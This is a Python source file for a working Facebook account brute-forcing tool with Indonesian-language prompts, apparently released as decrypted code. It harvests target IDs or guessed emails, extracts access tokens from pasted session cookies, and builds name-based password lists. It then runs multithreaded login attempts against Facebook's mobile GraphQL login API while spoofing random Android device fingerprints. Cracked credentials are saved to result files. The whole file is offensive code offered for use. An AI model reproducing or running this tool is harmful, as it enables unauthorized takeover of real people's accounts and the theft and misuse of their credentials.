# Decrypted by Exotic Hridoy
# Source & projects: https://github.com/cryptonite-core

import requests
import re
import time
import uuid
import os
import sys
import random
import json
import hashlib
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

now = datetime.now()
tgl = f'{now.day}-{now.month}-{now.year}.txt'
H = '\033[92m'
K = '\033[93m'
P = '\033[0m'

def Display():
    os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
    print(f'''
   _____   __            __
  / _/ /  / /  ___ _____/ /__
 / _/ _ \\/ _ \\/ _ `/ __/  '_/
/_//_.__/_//_/\\_,_/\\__/_/\\_\\
   Software By {H}Khamdihi-dev {K}v1.0{P}

''')

dumpdata = []
licensi_info = {}
loop, ok, cp = (0, 0, 0)
os.system('')

class Menu:
    def __init__(self):
        pass

    def validate_user(self):
        try:
            token = open('token.txt', 'r').read()
            cokie = open('cookie.txt', 'r').read()
            r = requests.get(f'https://graph.facebook.com/me?fields=id,name&access_token={token}', cookies={'cookie': cokie}).json()
            print(f"\n[+] Logged in user {H}{r['id']}|{r['name']}{P}")
        except KeyError:
            Login().Cookie()
        except Exception:
            Login().Cookie()

    def MenuNoLogin(self):
        Display()
        select = input('[1] Dump Email\n[2] Dump file\n[3] Chek hasil\n[4] Dump teman (Login required)\n\n[?] select : ')
        if select == '4':
            if not os.path.isfile('cookie.txt'):
                Login().Cookie()
            self.validate_user()
            userid = input('\n[?] masukan id facebook, gunakan tanda koma sebagai pemisah\n[?] userid : ').split(',')
            cookie = open('cookie.txt', 'r').read()
            token = open('token.txt', 'r').read()
            dump().friends(userid, token, cookie)
        elif select == '3':
            try:
                print()
                if not os.path.exists('result'):
                    print('[!] Folder result tidak ditemukan')
                    return

                for pt in os.listdir('result'):
                    print(f'* --> {H}result/{pt}{P}')
                ask_file = input('\n[?] masukan path : ')
                print()
                with open(ask_file, 'r') as f:
                    for check in f.read().splitlines():
                        print(check)
            except Exception as e:
                print(f'[!] Error: {e}')
        elif select == '2':
            files = input('\n[?] Nama file : ')
            pemisah = input('[?] Pemisahan uid dan nama : ')
            if os.path.isfile(files):
                try:
                    with open(files, 'r') as f:
                        for data_ in f.read().splitlines():
                            uid, name = data_.split(pemisah)
                            dumpdata.append(f'{uid}|{name}')
                    Facebook().Brute()
                except ValueError:
                    exit('\n[!] Format file tidak sesuai dengan pemisah yang diberikan.')
                except Exception as e:
                    exit(f'\n[!] Error: {e}')
            else:
                exit('\n[!] File tidak di temukan')
        elif select == '1':
            Namadepan = input('\n[?] Nama depan : ')
            NamaBelakang = input('[?] Nama Belakang : ')
            Domain = input('[?] Domain Email @gmail.com : ')
            dump().email(Namadepan, NamaBelakang, Domain)
        else:
            print('[!] Pilihan tidak valid')

class dump:
    def __init__(self):
        pass

    def email(self, nd: str, nb: str, dm: str) -> None:
        if os.path.isfile('asset/people.txt'):
            with open('asset/people.txt', 'r') as f:
                name = f.read().splitlines()
            for _ in range(5000):
                data_acak = [f'{nd}{random.choice(name)}{dm}|{nd}', f'{nb}{random.choice(name)}{dm}|{nb}', f'{nb}{random.randint(1, 999)}{dm}|{nb}', f'{nd}{random.randint(1, 999)}{dm}|{nd}']
                for email in data_acak:
                    if email not in dumpdata:
                        dumpdata.append(email)
            Facebook().Brute()
        else:
            exit('[!] File asset/people.txt tidak ditemukan')

    def friends(self, targetid, token, cok):
        for acc in targetid:
            try:
                params = {'access_token': token, 'fields': 'friends'}
                r = requests.get(f'https://graph.facebook.com/{acc}', params=params, headers={'cookie': cok}).json()
                for i in r['friends']['data']:
                    dumpdata.append(f"{i['id']}|{i['name']}")
            except Exception as e:
                print(f'[!] Error mendapatkan teman dari {acc}: {e}')
        Facebook().Brute()

class Login:
    def __init__(self):
        pass

    def Cookie(self):
        cookie_jar = input('\n[+] Tempel Cookie : ')
        headers_login = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en,id;q=0.9,en-GB;q=0.8,en-US;q=0.7',
            'dpr': '1.25',
            'priority': 'u=0, i',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Microsoft Edge";v="139", "Chromium";v="139"',
            'sec-ch-ua-full-version-list': '"Not;A=Brand";v="99.0.0.0", "Microsoft Edge";v="139.0.3405.86", "Chromium";v="139.0.7258.67"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"19.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0',
            'cookie': cookie_jar
        }
        try:
            r = requests.get('https://adsmanager.facebook.com/adsmanager/', headers=headers_login)
            if 'twofac_next%3Dhttps%253A%252F%252Fadsmanager' in r.text:
                self.auth_ig(cookie_jar)
                exit('\n[!] Silahkan coba aktifkan authentikasi 2factor dan coba lagi.')
            
            actId_match = re.search('act%3D(\d+)', r.text)
            if not actId_match:
                raise Exception("Tidak dapat menemukan act ID")
                
            actId = actId_match.group(1)
            response = requests.get(f'https://adsmanager.facebook.com/adsmanager/onboarding?nav_ref=biz_unified_f3_login_page_to_ads_manager&biz_login_source=biz_unified_f3_fb_login_button&join_id={str(uuid.uuid4())}&act={actId}#', headers=headers_login).text
            
            access_token_match = re.search('window.__accessToken="(.*?)"', response)
            if not access_token_match:
                raise Exception("Tidak dapat menemukan access token")
                
            access_token = access_token_match.group(1)
            
            with open('cookie.txt', 'w') as f:
                f.write(cookie_jar)
            with open('token.txt', 'w') as f:
                f.write(access_token)
            exit('\n[+] Login berhasil')
                    
        except Exception as e:
            self.auth_ig(cookie_jar)
            exit(f'\n[!] Sepertinya cookie kamu tidak aktif.. Error: {e}')

    def auth_ig(self, cokie):
        r = requests.Session()
        r.headers.update({
            'Accept-Language': 'id,en;q=0.9', 
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 
            'Referer': 'https://www.instagram.com/', 
            'Host': 'www.facebook.com', 
            'Sec-Fetch-Mode': 'cors', 
            'Accept': '*/*', 
            'Connection': 'keep-alive', 
            'Sec-Fetch-Site': 'cross-site', 
            'Sec-Fetch-Dest': 'empty', 
            'Origin': 'https://www.instagram.com', 
            'Accept-Encoding': 'gzip, deflate'
        })
        p = r.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie': cokie})
        if 'access_token' in str(p.headers):
            token_match = re.search('\"access_token\":\"(.*?)\"', str(p.headers))
            if token_match:
                token = token_match.group(1)
                with open('cookie.txt', 'w') as f:
                    f.write(cokie)
                with open('token.txt', 'w') as f:
                    f.write(token)
                exit('\n[+] Login berhasil')
        exit('\n[!] Autentikasi Instagram gagal')

class Facebook:
    def __init__(self):
        self.cookies = {
            'datr': 'gKGYaMFDH3Zw5Gg2sggX9tbi', 
            'sb': 'gKGYaLge53jtbcJoymqEnZXl', 
            'ps_l': '1', 
            'ps_n': '1', 
            'locale': 'en_GB', 
            'ar_debug': '1', 
            'dpr': '0.800000011920929', 
            'wd': '753x813', 
            'fr': '17jJ5GwVJ124HVX1v.AWd-mKxyaaZldjGyM-xLqjLxXWQdoZv9CHbBFSyJBR_CV0t877o.Bopyww..AAA.0.0.Bopyym.AWd2SPRWZdAJIRF4oBCB9jw-U_o'
        }

    def timezone(self):
        timezone_offset = -time.timezone // 60
        return timezone_offset

    def worldList(self, name, digit2, add2):
        pwd = []
        digits = ['123', '1234', '12345'] + digit2
        for nama in name.split(' '):
            if len(nama) >= 3:
                base = nama.lower()
                for d in digits:
                    pwd.append(base + d)
        for akh in add2:
            if akh not in pwd and len(akh) >= 6:
                pwd.append(akh)
        return list(set(pwd))

    def Brute(self):
        ask_met = input('\n[1] Graphql api\n[2] Graphql smartlock\n\n[?] select : ')
        pw_belakang = input('\n[+] Sandi angka belakang contoh (123,1234): ').split(',')
        pw_add_input = input('[?] Sandi tambahkan 6digit (skip enter) : ')
        pw_add = pw_add_input.split(',') if pw_add_input.strip() else []
        print()
        
        if not os.path.exists('result'):
            os.makedirs('result')
            
        with ThreadPoolExecutor(max_workers=35) as exe:
            for usr in dumpdata:
                try:
                    uid, name = usr.split('|')
                    passw = self.worldList(name, pw_belakang, pw_add)
                    if ask_met == '1':
                        exe.submit(self.ApiAuthLogin, uid, passw)
                    else:
                        exe.submit(self.ApiAuthSmartlock, uid, passw)
                except ValueError:
                    print(f'[!] Format data tidak valid: {usr}')
                    continue
        exit('\n[+] Proses selesai')

    def ApiAuthSmartlock(self, email, passwordList):
        global cp, loop, ok
        fid = str(uuid.uuid4())
        did = str(uuid.uuid4())
        wtr = str(uuid.uuid4())
        mid = uuid.uuid4().hex[:16]
        ctr = str(uuid.uuid4())   
        sim_hni = str(random.randint(51000, 51999))
        net_hni = str(random.randint(51000, 51999))
        fb_device_group = str(random.randint(50, 150))  

        fbav = f"{random.randint(400,600)}.0.0.{random.randint(10,99)}.{random.randint(10,99)}"
        fbbv = str(random.randint(100000000, 999999999))
        density = random.choice(["2.0","2.5","3.0","3.5","4.0"])
        width = random.choice([720,1080,1440])
        height = random.choice([1280,1920,2400])
        fblc = random.choice(["en_US","id_ID","fr_FR","es_ES"])
        fbcr = random.choice(["PSN","TSEL","INDOSAT","XL","AXIS","3ID","SMART"])
        fbmf = random.choice(["Samsung","vivo","Xiaomi","Oppo","Realme"])
        fbdv = random.choice(["SM-G991B","V2217A","M2101K7AG","CPH2457","RMX2202"])
        fbsv = random.choice(["9","10","11","12","13"])
        arch = random.choice(["arm64-v8a","armeabi-v7a","x86_64"])

        user_agent = (f"[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};"
                      f"FBDM/{{density={density},width={width},height={height}}};"
                      f"FBLC/{fblc};FBRV/0;FBCR/{fbcr};FBMF/{fbmf};FBBD/{fbmf};"
                      f"FBPN/com.facebook.katana;FBDV/{fbdv};FBSV/{fbsv};FBOP/1;FBCA/{arch};]")

        zero_eh = uuid.uuid4().hex
        privacy_context = str(random.randint(3000000000000000, 3999999999999999))

        print(f'\r[+] {loop}/{len(dumpdata)} OK:{ok} CP:{cp}                 ', end='', flush=True)
        for password in passwordList:
            if len(password) < 6:
                continue
            try:
                r = requests.Session()
                headers = {
                    'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'x-fb-sim-hni': sim_hni,
                    'x-fb-net-hni': net_hni,
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-graphql-client-library': 'graphservice',
                    'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
                    'x-tigon-is-retry': 'False',
                    'x-fb-privacy-context': privacy_context,
                    'x-graphql-request-purpose': 'fetch',
                    'x-fb-device-group': fb_device_group,
                    'user-agent': user_agent,
                    'x-zero-eh': zero_eh,
                    'x-zero-state': 'unknown',
                    'x-fb-connection-type': random.choice(["WIFI","MOBILE","CELL"]),
                    'x-fb-rmd': f"fail=Server:NoUrlMap,Default:INVALID_MAP;reqTime={random.randint(1600000000,1900000000)};recvTime=0",
                    'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
                    'x-fb-http-engine': 'Tigon/Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                }
                variables= {
                    "params":{
                        "params":json.dumps({
                            "params":json.dumps({
                                "client_input_params":{
                                    "block_store_machine_id":"",
                                    "device_id":did,
                                    "lois_settings":{"lois_token":""},
                                    "cloud_trust_token":None,
                                    "name":None,
                                    "machine_id":mid,
                                    "profile_pic_url":None,
                                    "contact_point":email,
                                    "encrypted_password":f"#PWD_FB4A:2:{int(time.time())}:{password}"
                                },
                                "server_params":{
                                    "is_from_logged_out":0,
                                    "layered_homepage_experiment_group":None,
                                    "INTERNAL__latency_qpl_marker_id":random.randint(30000000, 40000000),
                                    "family_device_id":fid,
                                    "device_id":did,
                                    "offline_experiment_group":"caa_iteration_v6_perf_fb_2",
                                    "waterfall_id":wtr,
                                    "access_flow_version":"pre_mt_behavior",
                                    "INTERNAL__latency_qpl_instance_id":random.randint(10**14, 10**15),
                                    "login_source":"Login",
                                    "is_from_logged_in_switcher":0,
                                    "is_platform_login":0
                                }
                            })
                        }),
                        "bloks_versioning_id":"ec30f3106c500cb65842f45cc9909fabb47965fd98b67aa7adde0ce8cd8f2ffe",
                        "app_id":"com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request"
                    },
                    "scale":"3",
                    "nt_context":{
                        "using_white_navbar":True,
                        "styles_id":uuid.uuid4().hex,
                        "pixel_ratio":3,
                        "is_push_on":True,
                        "debug_tooling_metadata_token":None,
                        "is_flipper_enabled":False,
                        "theme_params":[],
                        "bloks_version":"ec30f3106c500cb65842f45cc9909fabb47965fd98b67aa7adde0ce8cd8f2ffe"}
                }
                data = {
                        'method': 'post',
                        'pretty': 'false',
                        'format': 'json',
                        'server_timestamps': 'true',
                        'locale': 'en_US',
                        'purpose': 'fetch',
                        'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
                        'fb_api_caller_class': 'graphservice',
                        'client_doc_id': str(random.randint(119940804210000000000000000000,119940804219999999999999999999)),
                        'variables': json.dumps(variables),
                        'fb_api_analytics_tags': '["GraphServices"]',
                        'client_trace_id': ctr
                    }
                pos = r.post('https://b-graph.facebook.com/graphql', headers=headers, data=data, timeout=30).json()
                if 'session_key' in str(pos):
                    uid_match = re.search('"uid":(\d+)', str(pos).replace('\\', ''))
                    if uid_match:
                        uid = uid_match.group(1)
                        print(f'\r {H}* --> {uid}|{password}{P}')
                        Simpanhasil(f'{uid}|{password}', True)
                        ok += 1
                        break
                elif 'redirect_login_challenges' in str(pos):
                    cp += 1
                    print(f'\r {K}* --> {email}|{password}{P}')
                    Simpanhasil(f'{email}|{password}', False)
                    break
                elif 'Anda Tidak Dapat Menggunakan Fitur Ini Sekarang' in str(pos).replace('\\', ''):
                    print('\r[!] Mode pesawat IP kamu di block!', end='', flush=True)
                    time.sleep(3)
            except requests.exceptions.ConnectionError:
                time.sleep(20)
            except Exception as e:
                continue
        loop += 1

    def ApiAuthLogin(self, email, passwordList):
        global cp, loop, ok
        secure_family_device_id = str(uuid.uuid4())
        family_device_id = str(uuid.uuid4())
        device_id = str(uuid.uuid4())
        machine_id = uuid.uuid4().hex[:16]
        ctr = str(uuid.uuid4())
        waterfall_id = str(uuid.uuid4())
        username_input_id = f"id:{random.randint(10,99)}"
        password_input_id = f"id:{random.randint(100,999)}"
        qpl_instance_id = random.randint(200000000000000, 220000000000000)
        sim_hni = str(random.randint(51000, 52000))
        net_hni = str(random.randint(51000, 52000))
        fb_device_group = str(random.randint(50, 150))

        fbav = f"{random.randint(400,600)}.0.0.{random.randint(10,99)}.{random.randint(10,99)}"
        fbbv = str(random.randint(100000000, 999999999))
        density = random.choice(["2.0","2.5","3.0","3.5","4.0"])
        width = random.choice([720,1080,1440])
        height = random.choice([1280,1920,2400])
        fblc = random.choice(["en_US","id_ID","fr_FR","es_ES","pt_BR"])
        fbcr = random.choice(["PSN","TSEL","INDOSAT","XL","AXIS","3ID","SMART"])
        fbmf = random.choice(["Samsung","vivo","Xiaomi","Oppo","Realme"])
        fbdv = random.choice(["SM-G991B","V2217A","M2101K7AG","CPH2457","RMX2202"])
        fbsv = random.choice(["9","10","11","12","13"])
        arch = random.choice(["arm64-v8a","armeabi-v7a","x86_64"])

        user_agent = (f"[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};"
                      f"FBDM/{{density={density},width={width},height={height}}};"
                      f"FBLC/{fblc};FBRV/0;FBCR/{fbcr};FBMF/{fbmf};FBBD/{fbmf};"
                      f"FBPN/com.facebook.katana;FBDV/{fbdv};FBSV/{fbsv};FBOP/1;FBCA/{arch};]")
        print(f'\r[+] {loop}/{len(dumpdata)} OK:{ok} CP:{cp}                 ', end='', flush=True)
        for password in passwordList:
            if len(password) < 6:
                continue
            try:
                r = requests.Session()
                head = {
                    'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'x-fb-sim-hni': sim_hni,
                    'x-fb-net-hni': net_hni,
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-graphql-client-library': 'graphservice',
                    'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
                    'x-tigon-is-retry': 'False',
                    'x-fb-privacy-context': str(random.randint(3000000000000000, 3999999999999999)),
                    'x-graphql-request-purpose': 'fetch',
                    'x-fb-device-group': fb_device_group,
                    'user-agent': user_agent,
                    'x-zero-eh': uuid.uuid4().hex,
                    'x-zero-state': 'unknown',
                    'x-fb-connection-type': random.choice(["WIFI","MOBILE","CELL"]),
                    'x-fb-rmd': f"fail=Server:NoUrlMap,Default:INVALID_MAP;reqTime={int(time.time())};recvTime=0",
                    'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
                    'x-fb-http-engine': 'Tigon/Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                }
                variables = {
                    "params":{
                        "params":json.dumps({
                            "params":json.dumps({
                                "client_input_params":{
                                    "sim_phones":[],
                                    "aymh_accounts":[],
                                    "secure_family_device_id":secure_family_device_id,
                                    "attestation_result":{
                                        "data":base64.b64encode(json.dumps({
                                            "challenge_nonce":str(uuid.uuid4()),
                                            "username":email
                                        }).encode()).decode(),
                                        "signature":base64.b64encode(uuid.uuid4().bytes).decode(),
                                        "keyHash":uuid.uuid4().hex
                                    },
                                    "has_granted_read_contacts_permissions":0,
                                    "auth_secure_device_id":"",
                                    "has_whatsapp_installed":0,
                                    "password":f"#PWD_FB4A:2:{int(time.time())}:{password}",
                                    "sso_token_map_json_string":"",
                                    "block_store_machine_id":"",
                                    "cloud_trust_token":None,
                                    "event_flow":"login_manual",
                                    "password_contains_non_ascii":"false",
                                    "sim_serials":[],
                                    "client_known_key_hash":"",
                                    "encrypted_msisdn":"",
                                    "has_granted_read_phone_permissions":0,
                                    "app_manager_id":"null",
                                    "should_show_nested_nta_from_aymh":0,
                                    "device_id":device_id,
                                    "zero_balance_state":"",
                                    "login_attempt_count":1,
                                    "machine_id":machine_id,
                                    "flash_call_permission_status":{
                                        "READ_PHONE_STATE":"DENIED",
                                        "READ_CALL_LOG":"DENIED",
                                        "ANSWER_PHONE_CALLS":"DENIED"
                                    },
                                    "accounts_list":[],
                                    "family_device_id":family_device_id,
                                    "fb_ig_device_id":[],
                                    "device_emails":[],
                                    "try_num":1,
                                    "lois_settings":{"lois_token":""},
                                    "event_step":"home_page",
                                    "headers_infra_flow_id":"",
                                    "openid_tokens":{},
                                    "contact_point":email,
                                },
                                "server_params":{
                                    "should_trigger_override_login_2fa_action":0,
                                    "is_vanilla_password_page_empty_password":0,
                                    "is_from_logged_out":0,
                                    "should_trigger_override_login_success_action":0,
                                    "login_credential_type":"none",
                                    "server_login_source":"login",
                                    "waterfall_id":waterfall_id,
                                    "two_step_login_type":"one_step_login",
                                    "login_source":"Login",
                                    "is_platform_login":0,
                                    "pw_encryption_try_count":1,
                                    "INTERNAL__latency_qpl_marker_id":36707139,
                                    "is_from_aymh":0,
                                    "offline_experiment_group":"caa_iteration_v6_perf_fb_2",
                                    "is_from_landing_page":0,
                                    "password_text_input_id":password_input_id,
                                    "is_from_empty_password":0,
                                    "is_from_msplit_fallback":0,
                                    "ar_event_source":"login_home_page",
                                    "username_text_input_id":username_input_id,
                                    "layered_homepage_experiment_group":None,
                                    "device_id":device_id,
                                    "INTERNAL__latency_qpl_instance_id":qpl_instance_id,
                                    "reg_flow_source":"login_home_native_integration_point",
                                    "is_caa_perf_enabled":1,
                                    "credential_type":"password",
                                    "is_from_password_entry_page":0,
                                    "caller":"gslr",
                                    "family_device_id":family_device_id,
                                    "is_from_assistive_id":0,
                                    "access_flow_version":"pre_mt_behavior",
                                    "is_from_logged_in_switcher":0
                                }
                            })
                        }),
                        "bloks_versioning_id":"ec30f3106c500cb65842f45cc9909fabb47965fd98b67aa7adde0ce8cd8f2ffe",
                        "app_id":"com.bloks.www.bloks.caa.login.async.send_login_request"
                    },
                    "scale":"3",
                    "nt_context":{
                        "using_white_navbar":True,
                        "styles_id":uuid.uuid4().hex,
                        "pixel_ratio":3,
                        "is_push_on":True,
                        "debug_tooling_metadata_token":None,
                        "is_flipper_enabled":False,
                        "theme_params":[],
                        "bloks_version":"ec30f3106c500cb65842f45cc9909fabb47965fd98b67aa7adde0ce8cd8f2ffe"}
                }
                data = {
                    'method': 'post',
                    'pretty': 'false',
                    'format': 'json',
                    'server_timestamps': 'true',
                    'locale': 'en_US',
                    'purpose': 'fetch',
                    'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
                    'fb_api_caller_class': 'graphservice',
                    'client_doc_id': str(random.randint(100000000000000000000000000000,999999999999999999999999999999)),
                    'variables': json.dumps(variables),
                    'fb_api_analytics_tags': '["GraphServices"]',
                    'client_trace_id': ctr,
                }
                pos = r.post('https://b-graph.facebook.com/graphql', data=data, headers=head, timeout=30).json()
                if 'session_key' in str(pos):
                    uid_match = re.search('"name":"c_user","value":"(\d+)"', str(pos).replace('\\', ''))
                    if uid_match:
                        uid = uid_match.group(1)
                        print(f'\r {H}* --> {uid}|{password}{P}')
                        Simpanhasil(f'{uid}|{password}', True)
                        ok += 1
                        break
                elif 'redirect_login_challenges' in str(pos):
                    cp += 1
                    print(f'\r {K}* --> {email}|{password}{P}')
                    Simpanhasil(f'{email}|{password}', False)
                    break
                elif 'Anda Tidak Dapat Menggunakan Fitur Ini Sekarang' in str(pos).replace('\\', ''):
                    print('\r[!] Mode pesawat IP kamu di block!', end='', flush=True)
                    time.sleep(3)
            except requests.exceptions.ConnectionError:
                time.sleep(20)
            except Exception as e:
                continue
        loop += 1

def Simpanhasil(data, ok=False):
    try:
        if not os.path.exists('result'):
            os.makedirs('result')

        if ok:
            with open(f'result/OK-{tgl}', 'a') as f:
                f.write(data + '\n')
        else:
            with open(f'result/CP-{tgl}', 'a') as f:
                f.write(data + '\n')
    except Exception as e:
        print(f'[!] Gagal menyimpan hasil: {e}')

if __name__ == '__main__':
    Menu().MenuNoLogin()
